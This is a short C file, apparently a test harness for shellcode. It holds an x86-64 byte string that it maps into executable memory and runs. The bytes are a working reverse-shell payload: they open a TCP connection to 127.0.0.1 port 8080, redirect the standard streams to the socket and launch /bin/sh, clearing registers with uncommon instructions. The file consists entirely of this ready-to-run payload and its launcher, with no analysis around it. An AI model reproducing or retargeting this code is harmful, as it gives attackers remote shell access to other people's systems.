#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\x48\x31\xC0\xC4\xE2\xE0\xF2\xDB\xC4\xE2\xF0\xF2\xC9\x48\x29\xD2\x48\x29\xFF\x48\x29\xF6\xB0\x29\x6A\x02\x5F\x6A\x01\x5E\xC4\xE2\xE8\xF2\xD2\x0F\x05\x49\x89\xC1\x48\x97\x48\x31\xC9\xBB\x80\xff\xff\xfe\x83\xF3\xFF\x51\x51\x53\x66\x68\x1f\x90\x66\x6A\x02\x48\x89\xE6\x6A\x10\x5A\x48\x89\xFB\xB0\x2A\x0F\x05\x48\x29\xC0\x48\x31\xD2\xB0\x21\x4C\x89\xCF\x48\x31\xF6\x0F\x05\x48\x31\xC0\x48\x29\xD2\xB0\x21\x4C\x89\xCF\x48\xFF\xC6\x0F\x05\x48\x29\xC0\xC4\xE2\xE8\xF2\xD2\xB0\x21\x4C\x89\xCF\x48\xFF\xC6\x0F\x05\x48\x29\xC0\xC4\xE2\xE0\xF2\xDB\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x50\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\xB0\x3C\x0F\x05";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}